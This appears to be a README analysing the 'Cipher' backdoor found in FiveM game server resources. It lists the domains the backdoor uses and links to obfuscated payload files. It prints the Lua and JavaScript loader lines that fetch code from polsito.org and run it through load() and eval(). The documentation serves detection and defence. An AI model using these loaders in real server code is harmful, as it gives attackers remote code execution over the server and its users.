# CIPHER Backdoor

## Step 0? - Random URL
Cipher keeps using different new URLs to keep them undetected or not immediately noticeable, some of these URLs are/might be;
- polsito.org
- cipher-panel.me
- keyx.club
- 0resmon.net
- cfx-re.org
- kutingplays.com
- trezz.org
- dec4t.org

## ⚠️ Keep in mind that with some domains they try to imitate other shops or similar to appear more authentic. ⚠️

----------------

<details>
  <summary>LUA Payload (Click to expand)</summary>

  ## Step - 1 - Payload Code
  The Server loads this code from a js file to get and load the backdoor by a suspicious HTTP Request URL like this: `PerformHttpRequest('https://polsito.org/.........', function (e, d) pcall(function() assert(load(d))() end) end)`

  **Beautified:**
  ```lua
  PerformHttpRequest('https://polsito.org/..........', function(error, response) 
  	pcall(function() 
  		assert(load(response))() 
  	end)
  end)
  ```

  ## Step - 2 - Obfuscated Backdoor
  The backdoor itself is encrypted/obfuscated, so I will only be able to show the encrypted/obfuscated code:
  [Click here to get to the file](https://raw.githubusercontent.com/zImSkillz/fivem-known-backdoors/refs/heads/main/cipher-backdoor-locked-lua)
</details>

<details>
  <summary>JS Payload (Click to expand)</summary>

  ## Step - 1 - Payload Code:
  The Server loads this code from a js file to get and load the backdoor by a suspicious HTTP Request URL like this: `https.get('https://polsito.org/......',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d));})`

  **Beautified:**
  ```js
  https.get('https://polsito.org/........', response => {
    let data = '';
    response.on('data', chunk => data += chunk);
    response.on('end', () => eval(data));
  })
  ```
  
  ## Step - 2 - Obfuscated Backdoor
  The backdoor itself is encrypted/obfuscated, so I will only be able to show the encrypted/obfuscated code:
  [Click here to get to the file](https://raw.githubusercontent.com/zImSkillz/fivem-known-backdoors/refs/heads/main/cipher-backdoor-locked-js)
</details>

## Step - 3 - Injecting to other resources
Now Cipher installs itself in other resources and system files.
